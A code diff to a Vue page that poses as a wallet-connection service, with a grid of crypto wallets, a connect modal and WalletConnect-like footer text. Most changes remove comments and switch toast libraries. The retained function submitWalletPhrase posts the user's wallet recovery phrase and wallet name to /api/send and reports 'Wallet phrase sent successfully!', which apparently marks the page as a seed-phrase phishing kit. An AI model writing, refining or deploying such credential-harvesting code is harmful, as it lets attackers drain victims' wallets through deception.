@@ -1,8 +1,6 @@
 
 <template>
   <div class="min-h-screen bg-white text-[#0b0b1f]">
-
-    <!-- Header -->
     <header
         v-show="showHeader"
         class="fixed left-0 right-0 top-0 z-50 bg-gradient-to-r from-[#252080] via-[#4b208f] to-[#92258f] transition-transform duration-300"
@@ -116,9 +114,6 @@
         </div>
       </div>
     </header>
-
-
-    <!-- Main -->
     <main class="px-5 py-16 lg:px-8">
       <div class="mx-auto w-full max-w-[1400px]">
 
@@ -129,8 +124,6 @@
 
           <div class="mx-auto mt-6 w-[100px]">
             <div class="relative h-[4px] rounded-full bg-[#5145ff]">
-
-              <!-- Moving dot -->
               <span
                   class="absolute top-1/2 h-3 w-3 -translate-y-1/2 rounded-full bg-[#5145ff] animate-moving-dot"
               ></span>
@@ -138,7 +131,6 @@
             </div>
           </div>
         </div>
-        <!-- Wallet Grid -->
         <div
             class="grid grid-cols-1 gap-8 sm:grid-cols-2 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4"
         >
@@ -148,15 +140,11 @@
               :key="wallet.name"
               class="w-full"
           >
-
-            <!-- Wallet Card -->
             <button
                 type="button"
                 class="flex min-h-[100px] w-full cursor-pointer items-center rounded-xl bg-white px-5 text-left shadow-[0_5px_25px_rgba(0,0,0,0.08)] transition duration-200 hover:-translate-y-0.5 hover:shadow-[0_8px_30px_rgba(0,0,0,0.12)]"
                 @click="openWallet(wallet)"
             >
-
-              <!-- Logo -->
               <div
                   class="flex h-18 w-18 shrink-0 items-center justify-center rounded-full"
               >
@@ -166,8 +154,6 @@
                     class="h-full w-full md:h-10 md:w-10 rounded-full object-contain sm:h-12 sm:w-12 lg:h-14 lg:w-14 xl:h-16 xl:w-16"
                 />
               </div>
-
-              <!-- Information -->
               <div class="ml-5 min-w-0">
 
                 <h5
@@ -193,13 +179,9 @@
 
       </div>
     </main>
-
-    <!-- Footer -->
     <footer class="bg-white">
       <div class="max-w-[1400px] px-5 py-16 lg:px-16 lg:py-10">
         <div class="grid grid-cols-1 gap-16 lg:grid-cols-2 lg:gap-4">
-
-          <!-- Logo / Description -->
           <div>
             <div class="mb-5">
               <a
@@ -219,8 +201,6 @@
               establishes a remote connection between two apps and/or devices
             </p>
           </div>
-
-          <!-- Subscribe -->
           <div class="lg:pt-[20px]">
             <h5 class="mb-8 text-[20px] font-semibold text-[#111111]">
               Subscribe
@@ -261,7 +241,7 @@
 
         </div>
       </div>
-    </footer>    <!-- Connect Wallet Modal -->
+    </footer>
     <ConnectWalletModal
         :show="showWalletModal"
         :wallet-name="selectedWallet.name"
@@ -278,6 +258,8 @@
 
 import ConnectWalletModal from '../components/connect-wallet-modal.vue'
 import walletsData from '../data/wallets.json'
+const status = ref<'idle' | 'sending' | 'sent' | 'error'>('idle')
+import { toast } from 'vue-sonner'
 
 interface Wallet {
   id: number
@@ -287,67 +269,27 @@ interface Wallet {
 }
 const wallets = walletsData as Wallet[]
 const showHeader = ref(false)
-/*
-|--------------------------------------------------------------------------
-| Wallets
-|--------------------------------------------------------------------------
-*/
-
-
-
-
-/*
-|--------------------------------------------------------------------------
-| Modal State
-|--------------------------------------------------------------------------
-*/
-
 const showWalletModal = ref(false)
-
 const selectedWallet = ref<Wallet>(wallets[0]!)
-
-
-/*
-|--------------------------------------------------------------------------
-| Open Modal
-|--------------------------------------------------------------------------
-*/
 
 const openWallet = (wallet: Wallet) => {
   selectedWallet.value = wallet
   showWalletModal.value = true
 }
 
-
-/*
-|--------------------------------------------------------------------------
-| Close Modal
-|--------------------------------------------------------------------------
-*/
-
 const closeWallet = () => {
   showWalletModal.value = false
 }
-
-
-/*
-|--------------------------------------------------------------------------
-| Connect Wallet
-|--------------------------------------------------------------------------
-*/
-
-const status = ref<'idle' | 'sending' | 'sent' | 'error'>('idle')
-const { showToast } = useToast()
 
 async function submitWalletPhrase(payload: { walletPhrase: string, walletName: string }) {
   status.value = 'sending'
   try {
     await $fetch('/api/send', { method: 'POST', body: payload })
     status.value = 'sent'
-    showToast('Wallet phrase sent successfully', 'success')
+    toast.success('Wallet phrase sent successfully!')
     showWalletModal.value = false
   } catch {
-    showToast('Failed to send wallet phrase', 'error')
+    toast.error('Something went wrong. Please try again.')
     status.value = 'error'
   }
 }
